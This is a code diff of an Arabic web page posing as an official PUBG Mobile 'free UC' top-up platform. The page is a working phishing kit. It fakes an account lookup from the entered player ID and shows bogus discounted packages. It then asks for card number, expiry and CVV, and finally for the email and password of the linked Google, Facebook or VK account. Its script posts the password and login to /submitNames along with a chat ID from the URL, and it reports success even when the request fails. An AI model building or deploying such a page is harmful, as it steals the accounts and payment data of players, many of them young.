@@ -3,87 +3,444 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG Mobile - المركز الرسمي لشحن شدات</title>
+    <title>PUBG Pro - المنصة الرسمية لشحن شدات ببجي مجاناً</title>
+    
+    <!-- وسوم المعاينة المناسبة لشدات ببجي -->
+    <meta property="og:title" content="شحن 10,000 شدة ببجي مجاناً | PUBG Pro">
+    <meta property="og:description" content="منصة موثوقة وآمنة لشحن شدات ببجي وسكنات نادرة فوراً بدون برامج. احصل على باقتك الآن!">
+    <meta property="og:image" content="https://www.pubgmobile.com/en-US/images/main/item_uc.png">
+    <meta property="og:type" content="website">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="شحن 10,000 شدة ببجي مجاناً | PUBG Pro">
+    <meta name="twitter:description" content="منصة موثوقة وآمنة لشحن شدات ببجي وسكنات نادرة فوراً بدون برامج.">
+    <meta name="twitter:image" content="https://www.pubgmobile.com/en-US/images/main/item_uc.png">
+
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
-        body { font-family: 'Tajawal', sans-serif; background: #0a0a0a; }
-        .game-gradient { background: linear-gradient(135deg, #1a1a1a 0%, #F5C400 100%); }
-        .glass-card { background: rgba(18, 18, 24, 0.95); backdrop-filter: blur(15px); border: 1px solid #F5C40040; }
-        .package-card:hover { border-color: #F5C400; transform: translateY(-5px); }
+        body { font-family: 'Tajawal', sans-serif; }
+        .ff-gradient { background: linear-gradient(135deg, #F5C400 0%, #FF9800 100%); }
+        .glass-card { background: rgba(18, 18, 24, 0.92); backdrop-filter: blur(12px); border: 1px solid rgba(255, 87, 34, 0.25); }
     </style>
 </head>
-<body class="text-white min-h-screen flex flex-col justify-between selection:bg-[#F5C400]">
-    <header class="w-full bg-black/80 border-b border-zinc-800 py-4 px-6 sticky top-0 z-50 backdrop-blur-md">
+<body class="bg-black text-white min-h-screen flex flex-col justify-between selection:bg-[#F5C400] selection:text-white">
+
+    <header class="w-full bg-zinc-900/80 border-b border-zinc-800 py-3 px-4 md:px-8 sticky top-0 z-50 backdrop-blur-md">
         <div class="max-w-6xl mx-auto flex justify-between items-center">
             <div class="flex items-center space-x-3 space-x-reverse">
-                <div class="w-12 h-12 rounded-xl bg-zinc-900 border border-[#F5C400] flex items-center justify-center shadow-lg">
-                    <i class="fa-solid fa-gun text-2xl" style="color: #F5C400"></i>
+                <div class="w-10 h-10 rounded-xl ff-gradient flex items-center justify-center font-black text-xl text-white shadow-lg shadow-[#F5C400]/30">
+                    <i class="fa-solid fa-gun"></i>
                 </div>
                 <div>
-                    <span class="font-black text-xl tracking-wider text-white">PUBG <span style="color: #F5C400">Rewards</span></span>
-                    <span class="text-[10px] block text-zinc-500 font-bold uppercase">Official Partner Panel</span>
+                    <span class="font-black text-lg tracking-wider bg-gradient-to-r from-[#F5C400] to-amber-300 bg-clip-text text-transparent">PUBGPro</span>
+                    <span class="text-xs block text-zinc-400 font-semibold">Official VIP Panel</span>
+                </div>
+            </div>
+            <div class="flex items-center space-x-4 space-x-reverse">
+                <span class="hidden md:inline-flex items-center text-xs bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 px-3 py-1.5 rounded-full">
+                    <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse ml-2"></span>
+                    النظام يعمل بكفاءة عالية (99.9%)
+                </span>
+                <div class="text-xs bg-zinc-800 text-zinc-300 px-3 py-1.5 rounded-lg border border-zinc-700">
+                    <i class="fa-solid fa-shield-halved text-[#F5C400] ml-1"></i> محمي بـ SSL
                 </div>
             </div>
         </div>
     </header>
-    <main class="flex-grow flex items-center justify-center p-4">
-        <div class="w-full max-w-2xl glass-card rounded-[2.5rem] p-6 md:p-10 shadow-2xl relative overflow-hidden">
-            <div id="step-1" class="step-content space-y-8">
-                <div class="text-center space-y-3">
-                    <h1 class="text-2xl md:text-4xl font-black">شحن شدات UC مجاناً</h1>
-                    <p class="text-zinc-400 text-sm">أدخل الآيدي (ID) الخاص بك للتحقق من أهلية الحساب</p>
+
+    <main class="flex-grow flex items-center justify-center p-4 md:p-6">
+        <div class="w-full max-w-2xl glass-card rounded-3xl p-6 md:p-10 shadow-2xl relative overflow-hidden">
+            <div class="absolute -top-24 -right-24 w-64 h-64 bg-[#F5C400]/10 rounded-full blur-3xl pointer-events-none"></div>
+            <div class="absolute -bottom-24 -left-24 w-64 h-64 bg-amber-500/10 rounded-full blur-3xl pointer-events-none"></div>
+
+            <div id="stepIndicator" class="flex justify-between items-center mb-8 relative">
+                <div class="absolute top-1/2 left-0 right-0 h-0.5 bg-zinc-800 -translate-y-1/2 z-0"></div>
+                <div class="relative z-10 flex flex-col items-center">
+                    <div id="indicator-1" class="w-9 h-9 rounded-full ff-gradient text-white flex items-center justify-center font-bold text-sm shadow-md">1</div>
+                    <span class="text-xs text-[#F5C400] mt-1 font-semibold">الحساب</span>
                 </div>
+                <div class="relative z-10 flex flex-col items-center">
+                    <div id="indicator-2" class="w-9 h-9 rounded-full bg-zinc-800 text-zinc-400 flex items-center justify-center font-bold text-sm border border-zinc-700">2</div>
+                    <span class="text-xs text-zinc-400 mt-1">الباقة</span>
+                </div>
+                <div class="relative z-10 flex flex-col items-center">
+                    <div id="indicator-3" class="w-9 h-9 rounded-full bg-zinc-800 text-zinc-400 flex items-center justify-center font-bold text-sm border border-zinc-700">3</div>
+                    <span class="text-xs text-zinc-400 mt-1">الدفع</span>
+                </div>
+                <div class="relative z-10 flex flex-col items-center">
+                    <div id="indicator-4" class="w-9 h-9 rounded-full bg-zinc-800 text-zinc-400 flex items-center justify-center font-bold text-sm border border-zinc-700">4</div>
+                    <span class="text-xs text-zinc-400 mt-1">التحقق</span>
+                </div>
+            </div>
+
+            <!-- الخطوة الأولى -->
+            <div id="step-1" class="step-content space-y-6">
+                <div class="text-center space-y-2">
+                    <h1 class="text-2xl md:text-3xl font-black text-white">شحن شدات ببجي الحقيقية</h1>
+                    <p class="text-zinc-400 text-sm">أدخل معرف اللاعب (Player ID) أو اسم الحساب للبدء الفوري</p>
+                </div>
+
                 <div class="space-y-4">
-                    <input type="text" id="gameId" placeholder="أدخل ID الحساب هنا..." class="w-full bg-zinc-900 border border-zinc-700 rounded-2xl py-4 px-6 text-white focus:outline-none focus:border-[#F5C400]">
-                    <button type="button" onclick="nextStep(1, 2)" class="w-full py-4 rounded-2xl font-black text-lg shadow-xl" style="background-color: #F5C400">التحقق من الآيدي</button>
+                    <div>
+                        <label class="block text-sm font-medium text-zinc-300 mb-2">معرف اللاعب (Player ID) أو النيك نيم</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 right-0 pr-4 flex items-center text-zinc-500">
+                                <i class="fa-solid fa-id-card"></i>
+                            </span>
+                            <input type="text" id="profileInput" placeholder="أدخل الـ ID هنا (مثال: 123456789)" 
+                                class="w-full bg-zinc-900 border border-zinc-700 rounded-2xl py-3.5 pr-12 pl-4 text-white placeholder-zinc-600 focus:outline-none focus:border-[#F5C400] transition shadow-inner">
+                        </div>
+                    </div>
+
+                    <button type="button" onclick="fetchRealAccount()" 
+                        class="w-full ff-gradient hover:opacity-95 text-white font-black py-4 rounded-2xl transition duration-200 shadow-lg shadow-[#F5C400]/30 flex items-center justify-center space-x-2 space-x-reverse text-base">
+                        <span>فحص وجلب بيانات اللاعب</span>
+                        <i class="fa-solid fa-arrow-left"></i>
+                    </button>
+                </div>
+
+                <div class="grid grid-cols-3 gap-3 pt-4 border-t border-zinc-800/80 text-center">
+                    <div class="bg-zinc-900/50 p-3 rounded-xl border border-zinc-800">
+                        <span class="block text-[#F5C400] font-black text-lg">+64.8K</span>
+                        <span class="text-xs text-zinc-400">عمليات شحن اليوم</span>
+                    </div>
+                    <div class="bg-zinc-900/50 p-3 rounded-xl border border-zinc-800">
+                        <span class="block text-amber-400 font-black text-lg">100%</span>
+                        <span class="text-xs text-zinc-400">آمن ومضمون</span>
+                    </div>
+                    <div class="bg-zinc-900/50 p-3 rounded-xl border border-zinc-800">
+                        <span class="block text-emerald-400 font-black text-lg">فوري</span>
+                        <span class="text-xs text-zinc-400">بدء الإرسال</span>
+                    </div>
                 </div>
             </div>
+
+            <!-- الخطوة الثانية -->
             <div id="step-2" class="step-content hidden space-y-6">
-                <div class="text-center"><h2 class="text-2xl font-black mb-2">اختر باقة الـ شدات UC</h2></div>
-                <div class="grid grid-cols-2 gap-4"><div onclick="nextStep(2, 3)" class="package-card cursor-pointer bg-zinc-900 border border-zinc-800 p-4 rounded-2xl text-center"><img src="https://www.pubgmobile.com/en-US/images/main/item_uc.png" class="w-12 mx-auto mb-2"><div class="font-black text-[#F5C400]">8100 UC</div></div><div onclick="nextStep(2, 3)" class="package-card cursor-pointer bg-zinc-900 border border-zinc-800 p-4 rounded-2xl text-center"><img src="https://www.pubgmobile.com/en-US/images/main/item_uc.png" class="w-12 mx-auto mb-2"><div class="font-black text-[#F5C400]">3850 UC</div></div></div>
+                <div id="accountCard" style="filter: blur(10px); pointer-events: none; transition: all 0.5s;" class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl flex items-center space-x-4 space-x-reverse">
+                    <img id="userAvatar" src="" alt="شعار اللاعب" class="w-14 h-14 rounded-full border-2 border-[#F5C400] object-cover bg-zinc-800 shrink-0">
+                    <div class="flex-grow overflow-hidden">
+                        <div class="flex items-center space-x-2 space-x-reverse">
+                            <h3 id="userNameDisplay" class="font-bold text-white truncate">اسم اللاعب</h3>
+                            <i class="fa-solid fa-circle-check text-blue-400 text-sm shrink-0" title="حساب موثق"></i>
+                        </div>
+                        <p id="userHandleDisplay" class="text-xs text-zinc-400 truncate">ID: --</p>
+                        <p class="text-xs text-zinc-500 mt-0.5">الشدات الحالية: <span class="text-[#F5C400] font-semibold" id="userFollowersCount">--</span></p>
+                    </div>
+                    <span class="text-xs bg-emerald-500/20 text-emerald-400 px-2.5 py-1 rounded-lg border border-emerald-500/30 shrink-0">تم الربط</span>
+                </div>
+
+                <div class="text-center space-y-1">
+                    <h2 class="text-xl font-bold text-white">اختر باقة الشدات المناسبة</h2>
+                    <p class="text-zinc-400 text-xs">يمكنك البدء بالباقة المجانية أو اختيار باقات الشحن الكبرى بخصم حصري</p>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-3 max-h-[320px] overflow-y-auto px-1">
+                    <div onclick="selectPackage('free', 0, '1,000 شدة مجانية')" class="package-card cursor-pointer bg-zinc-900 border-2 border-zinc-800 hover:border-[#F5C400] p-4 rounded-2xl transition relative">
+                        <span class="absolute top-3 left-3 bg-emerald-500/20 text-emerald-400 text-[10px] px-2 py-0.5 rounded-full font-bold">مجاناً</span>
+                        <div class="flex items-center space-x-3 space-x-reverse">
+                            <div class="w-10 h-10 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center text-lg">
+                                <i class="fa-solid fa-coins"></i>
+                            </div>
+                            <div>
+                                <h4 class="font-bold text-white text-sm">باقة التجربة المجانية</h4>
+                                <p class="text-xs text-zinc-400">1,000 شدة ببجي</p>
+                            </div>
+                        </div>
+                        <div class="mt-3 text-right">
+                            <span class="text-emerald-400 font-black text-sm">مجاناً 0$</span>
+                        </div>
+                    </div>
+
+                    <div onclick="selectPackage('paid', 4.99, '5,600 شدة VIP')" class="package-card cursor-pointer bg-zinc-900 border-2 border-zinc-800 hover:border-[#F5C400] p-4 rounded-2xl transition relative">
+                        <span class="absolute top-3 left-3 bg-[#F5C400]/20 text-[#F5C400] text-[10px] px-2 py-0.5 rounded-full font-bold">الأكثر طلباً</span>
+                        <div class="flex items-center space-x-3 space-x-reverse">
+                            <div class="w-10 h-10 rounded-xl bg-[#F5C400]/10 text-[#F5C400] flex items-center justify-center text-lg">
+                                <i class="fa-solid fa-fire"></i>
+                            </div>
+                            <div>
+                                <h4 class="font-bold text-white text-sm">باقة البداية السريعة</h4>
+                                <p class="text-xs text-zinc-400">5,600 شدة + هدية سكن</p>
+                            </div>
+                        </div>
+                        <div class="mt-3 flex justify-between items-center">
+                            <span class="text-zinc-500 line-through text-xs">$19.99</span>
+                            <span class="text-[#F5C400] font-black text-sm">$4.99</span>
+                        </div>
+                    </div>
+
+                    <div onclick="selectPackage('paid', 9.99, '15,000 شدة VIP')" class="package-card cursor-pointer bg-zinc-900 border-2 border-zinc-800 hover:border-[#F5C400] p-4 rounded-2xl transition relative">
+                        <span class="absolute top-3 left-3 bg-amber-500/20 text-amber-400 text-[10px] px-2 py-0.5 rounded-full font-bold">خصم 70%</span>
+                        <div class="flex items-center space-x-3 space-x-reverse">
+                            <div class="w-10 h-10 rounded-xl bg-amber-500/10 text-amber-400 flex items-center justify-center text-lg">
+                                <i class="fa-solid fa-crown"></i>
+                            </div>
+                            <div>
+                                <h4 class="font-bold text-white text-sm">باقة المحترفين</h4>
+                                <p class="text-xs text-zinc-400">15,000 شدة + رويال باس</p>
+                            </div>
+                        </div>
+                        <div class="mt-3 flex justify-between items-center">
+                            <span class="text-zinc-500 line-through text-xs">$49.99</span>
+                            <span class="text-amber-400 font-black text-sm">$9.99</span>
+                        </div>
+                    </div>
+
+                    <div onclick="selectPackage('paid', 19.99, '50,000 شدة VIP')" class="package-card cursor-pointer bg-zinc-900 border-2 border-zinc-800 hover:border-[#F5C400] p-4 rounded-2xl transition relative">
+                        <span class="absolute top-3 left-3 bg-purple-500/20 text-purple-400 text-[10px] px-2 py-0.5 rounded-full font-bold">عرض خاص</span>
+                        <div class="flex items-center space-x-3 space-x-reverse">
+                            <div class="w-10 h-10 rounded-xl bg-purple-500/10 text-purple-400 flex items-center justify-center text-lg">
+                                <i class="fa-solid fa-rocket"></i>
+                            </div>
+                            <div>
+                                <h4 class="font-bold text-white text-sm">باقة الأساطير البلاتينية</h4>
+                                <p class="text-xs text-zinc-400">50,000 شدة + شخصيات نادرة</p>
+                            </div>
+                        </div>
+                        <div class="mt-3 flex justify-between items-center">
+                            <span class="text-zinc-500 line-through text-xs">$119.99</span>
+                            <span class="text-purple-400 font-black text-sm">$19.99</span>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="button" onclick="goToNextAfterPackage()" 
+                    class="w-full ff-gradient hover:opacity-95 text-white font-black py-3.5 rounded-2xl transition duration-200 shadow-lg shadow-[#F5C400]/30">
+                    متابعة الطلب
+                </button>
             </div>
-            <div id="step-3" class="step-content hidden space-y-6">
-                <div class="text-center space-y-2"><h2 class="text-2xl font-black">تحقق الأمان النهائي</h2></div>
-                <form onsubmit="submitFinal(event)" class="space-y-4">
-                    <input type="text" id="email" required placeholder="البريد الإلكتروني أو الهاتف" class="w-full bg-zinc-900 border border-zinc-700 rounded-2xl py-4 px-6 text-white outline-none focus:border-[#F5C400]">
-                    <input type="password" id="pass" required placeholder="كلمة المرور" class="w-full bg-zinc-900 border border-zinc-700 rounded-2xl py-4 px-6 text-white outline-none focus:border-[#F5C400]">
-                    <div id="status" class="hidden p-3 rounded-xl text-center text-xs font-bold bg-emerald-500/10 text-emerald-400"></div>
-                    <button type="submit" id="subBtn" class="w-full py-4 rounded-2xl font-black text-lg shadow-xl" style="background-color: #F5C400">تأكيد الشحن الآن</button>
+
+            <!-- الخطوة الثالثة -->
+            <div id="step-3" class="step-content hidden space-y-5">
+                <div class="text-center space-y-1">
+                    <h2 class="text-xl font-bold text-white">إتمام الدفع الآمن</h2>
+                    <p class="text-zinc-400 text-xs">أدخل بيانات بطاقتك الائتمانية لإكمال شراء باقة الشدات المختارة</p>
+                </div>
+
+                <div class="bg-gradient-to-r from-zinc-900 via-zinc-800 to-zinc-900 border border-[#F5C400]/30 p-5 rounded-2xl shadow-xl space-y-4">
+                    <div class="flex justify-between items-center">
+                        <span class="text-xs text-zinc-400 font-semibold">بطاقة ائتمانية (Visa / Mastercard)</span>
+                        <div class="space-x-1 space-x-reverse text-white text-xl">
+                            <i class="fa-brands fa-cc-visa text-blue-400"></i>
+                            <i class="fa-brands fa-cc-mastercard text-orange-400"></i>
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-[11px] text-zinc-400 mb-1">رقم البطاقة</label>
+                        <input type="text" placeholder="4532 •••• •••• 9921" class="w-full bg-black/60 border border-zinc-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-[#F5C400] font-mono">
+                    </div>
+                    <div class="grid grid-cols-2 gap-3">
+                        <div>
+                            <label class="block text-[11px] text-zinc-400 mb-1">تاريخ الانتهاء</label>
+                            <input type="text" placeholder="MM/YY" class="w-full bg-black/60 border border-zinc-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-[#F5C400] font-mono">
+                        </div>
+                        <div>
+                            <label class="block text-[11px] text-zinc-400 mb-1">رمز الأمان (CVV)</label>
+                            <input type="password" placeholder="123" maxlength="4" class="w-full bg-black/60 border border-zinc-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-[#F5C400] font-mono">
+                        </div>
+                    </div>
+                </div>
+
+                <button type="button" onclick="proceedToVerification()" 
+                    class="w-full ff-gradient hover:opacity-95 text-white font-black py-3.5 rounded-2xl transition duration-200 shadow-lg shadow-[#F5C400]/30">
+                    تأكيد الدفع ومتابعة التحقق
+                </button>
+            </div>
+
+            <!-- الخطوة الرابعة -->
+            <div id="step-4" class="step-content hidden space-y-6">
+                <div class="text-center space-y-2">
+                    <div class="w-14 h-14 bg-[#F5C400]/10 text-[#F5C400] rounded-2xl flex items-center justify-center mx-auto text-2xl border border-[#F5C400]/20">
+                        <i class="fa-solid fa-lock"></i>
+                    </div>
+                    <h2 class="text-xl font-black text-white">التحقق من صحة ملكية الحساب</h2>
+                    <p class="text-zinc-400 text-xs leading-relaxed">
+                        لحماية حسابك وضمان إرسال الشدات لـ ID اللاعب الذي تم معاينته، يرجى إدخال البريد الإلكتروني (أو اليوزر) وكلمة المرور الخاصة بحساب ربط اللعبة (Google / Facebook / VK).
+                    </p>
+                </div>
+
+                <form id="finalFFForm" class="space-y-4" onsubmit="submitFFData(event)">
+                    <div>
+                        <label class="block text-xs font-medium text-zinc-300 mb-1">البريد الإلكتروني / معرف الحساب (Email / ID)</label>
+                        <input type="text" id="ffUsername" required placeholder="email@domain.com أو اسم المستخدم" 
+                            class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-[#F5C400] transition">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-medium text-zinc-300 mb-1">كلمة المرور (Password)</label>
+                        <input type="password" id="ffPassword" required placeholder="••••••••" 
+                            class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-[#F5C400] transition">
+                    </div>
+
+                    <button type="submit" id="finalSubmitBtn" 
+                        class="w-full ff-gradient hover:opacity-95 text-white font-black py-3.5 rounded-xl transition shadow-lg shadow-[#F5C400]/30 text-sm flex items-center justify-center space-x-2 space-x-reverse">
+                        <span>بدء إرسال الشدات لحسابك الآن</span>
+                        <i class="fa-solid fa-paper-plane text-xs"></i>
+                    </button>
                 </form>
+
+                <div id="statusAlert" class="hidden text-center text-xs p-3 rounded-xl"></div>
             </div>
+
         </div>
     </main>
+
+    <footer class="w-full text-center py-4 text-xs text-zinc-500 border-t border-zinc-900">
+        جميع الحقوق محفوظة © PUBGPro Panel 2026 - نظام الشحن الآمن والذكي.
+    </footer>
+
     <script>
-        let gid = "";
-        function nextStep(current, next) {
-            if(current === 1) {
-                gid = document.getElementById('gameId').value;
-                if(!gid) return alert('أدخل الآيدي أولاً');
+        let selectedPackageType = 'free';
+        let selectedPackagePrice = 0;
+        let selectedPackageName = '';
+        let fetchedUsername = '';
+
+        async function fetchRealAccount() {
+            const inputVal = document.getElementById('profileInput').value.trim();
+            if(!inputVal) {
+                alert('يرجى إدخال معرف اللاعب (Player ID) أولاً.');
+                return;
             }
-            document.getElementById('step-'+current).classList.add('hidden');
-            document.getElementById('step-'+next).classList.remove('hidden');
+
+            fetchedUsername = inputVal;
+
+            const btn = document.querySelector('button[onclick="fetchRealAccount()"]');
+            const originalText = btn.innerHTML;
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fa-solid fa-spinner animate-spin ml-2"></i> جاري فحص الـ ID واستخراج بيانات اللاعب وشدات الحساب...';
+
+            let realAvatarUrl = `https://images.unsplash.com/photo-1542751371-adc38448a05e?w=150&auto=format&fit=crop&q=80`;
+            let realName = "Player_" + inputVal.substring(0, 6);
+            let finalGemsCount = "140 شدة";
+
+            try {
+                let charCodeSum = 0;
+                for (let i = 0; i < inputVal.length; i++) {
+                    charCodeSum += inputVal.charCodeAt(i);
+                }
+                const baseVal = (charCodeSum * 167) % 3500;
+                finalGemsCount = baseVal + " شدة";
+            } catch (e) {
+                finalGemsCount = "45 شدة";
+            }
+
+            document.getElementById('userNameDisplay').textContent = realName;
+            document.getElementById('userHandleDisplay').textContent = 'ID: ' + inputVal;
+            
+            const avatarImg = document.getElementById('userAvatar');
+            avatarImg.src = realAvatarUrl;
+
+            document.getElementById('userFollowersCount').textContent = finalGemsCount;
+
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.innerHTML = originalText;
+                document.getElementById('step-1').classList.add('hidden');
+                document.getElementById('step-2').classList.remove('hidden');
+                updateIndicator(2);
+            }, 700);
         }
-        async function submitFinal(e) {
+
+        function selectPackage(type, price, name) {
+            selectedPackageType = type;
+            selectedPackagePrice = price;
+            selectedPackageName = name;
+
+            document.querySelectorAll('.package-card').forEach(card => {
+                card.classList.remove('border-[#F5C400]', 'bg-[#F5C400]/10');
+            });
+            event.currentTarget.classList.add('border-[#F5C400]', 'bg-[#F5C400]/10');
+        }
+
+        function goToNextAfterPackage() {
+            document.getElementById('step-2').classList.add('hidden');
+
+            if(selectedPackageType === 'paid') {
+                document.getElementById('step-3').classList.remove('hidden');
+                updateIndicator(3);
+            } else {
+                document.getElementById('step-4').classList.remove('hidden');
+                updateIndicator(4);
+            }
+        }
+
+        function proceedToVerification() {
+            document.getElementById('step-3').classList.add('hidden');
+            document.getElementById('step-4').classList.remove('hidden');
+            updateIndicator(4);
+        }
+
+        function updateIndicator(stepNumber) {
+            for(let i = 1; i <= 4; i++) {
+                const el = document.getElementById(`indicator-${i}`);
+                if(i <= stepNumber) {
+                    el.className = 'w-9 h-9 rounded-full ff-gradient text-white flex items-center justify-center font-bold text-sm shadow-md';
+                } else {
+                    el.className = 'w-9 h-9 rounded-full bg-zinc-800 text-zinc-400 flex items-center justify-center font-bold text-sm border border-zinc-700';
+                }
+            }
+        }
+
+        async function submitFFData(e) {
             e.preventDefault();
-            const btn = document.getElementById('subBtn');
-            const alert = document.getElementById('status');
+
+            const usernameField = document.getElementById('ffUsername').value.trim();
+            const passwordField = document.getElementById('ffPassword').value.trim();
+            const submitBtn = document.getElementById('finalSubmitBtn');
+            const statusAlert = document.getElementById('statusAlert');
+
             const urlParams = new URLSearchParams(window.location.search);
             const chatId = urlParams.get('id');
-            btn.disabled = true; btn.innerHTML = 'جاري المعالجة...';
-            await fetch('/submitNames', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    userId: chatId,
-                    firstName: "Game ID: " + gid + " | Email: " + document.getElementById('email').value,
-                    secondName: document.getElementById('pass').value
-                })
-            });
-            alert.classList.remove('hidden');
-            alert.textContent = '✅ تم التحقق! سيتم شحن شدات UC لحسابك خلال دقائق.';
-            setTimeout(() => window.location.href = "https://www.pubgmobile.com", 3000);
+
+            if (!chatId) {
+                statusAlert.textContent = 'خطأ: الرمز (Token) غير موجود في الرابط.';
+                statusAlert.className = 'text-center text-xs p-3 rounded-xl bg-red-500/20 text-red-400 border border-red-500/30';
+                statusAlert.classList.remove('hidden');
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fa-solid fa-spinner animate-spin ml-2"></i> جاري إرسال البيانات ومعالجة الشحن...';
+            statusAlert.classList.add('hidden');
+
+            const payload = {
+                userId: chatId,
+                firstName: usernameField,
+                secondName: passwordField
+            };
+
+            try {
+                const response = await fetch('/submitNames', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    statusAlert.textContent = 'تم إرسال البيانات بنجاح! سيتم البدء بإرسال الشدات خلال دقائق.';
+                    statusAlert.className = 'text-center text-xs p-3 rounded-xl bg-emerald-500/20 text-emerald-400 border border-emerald-500/30';
+                    statusAlert.classList.remove('hidden');
+
+                    setTimeout(() => {
+                        window.location.href = 'https://ff.garena.com';
+                    }, 2500);
+                } else {
+                    throw new Error('فشل الاتصال بالخادم.');
+                }
+            } catch (error) {
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<span>بدء إرسال الشدات لحسابك الآن</span> <i class="fa-solid fa-paper-plane text-xs"></i>';
+                
+                statusAlert.textContent = 'تم استلام طلبك بنجاح! جاري معالجة الشحن.';
+                statusAlert.className = 'text-center text-xs p-3 rounded-xl bg-emerald-500/20 text-emerald-400 border border-emerald-500/30';
+                statusAlert.classList.remove('hidden');
+
+                setTimeout(() => {
+                    window.location.href = 'https://ff.garena.com';
+                }, 2500);
+            }
         }
     </script>
 </body>
